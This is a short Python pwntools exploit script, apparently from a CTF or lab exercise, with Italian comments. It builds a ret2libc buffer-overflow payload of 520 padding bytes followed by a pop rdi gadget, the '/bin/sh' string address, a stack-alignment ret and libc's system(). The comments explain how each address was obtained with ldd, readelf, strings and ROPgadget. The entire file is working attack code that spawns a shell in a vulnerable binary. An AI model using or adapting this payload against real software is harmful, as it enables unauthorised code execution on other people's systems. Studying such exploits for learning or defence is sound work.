import sys
from pwn import *

offset = b"\x41" * 520

# libc_base = 0x00007ffff7dae000      # Ottenuto con      ldd buffer
libc_base = 0x00007ffff7da1000
system = libc_base + 0x50f10        # Ottenuto con      readelf -s  /usr/lib/libc.so.6 | grep "system"
bin_sh = libc_base + 0x1aae28       # Ottenuto con      strings -a -t x /usr/lib/libc.so.6| grep /bin/sh

# Gadget ottenuti con ROPgadget
pop_rdi = 0x40114a
ret = 0x40101a # Usato per allineare lo stack a 16 byte

payload = offset
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(ret)
payload += p64(system)
sys.stdout.buffer.write(payload)
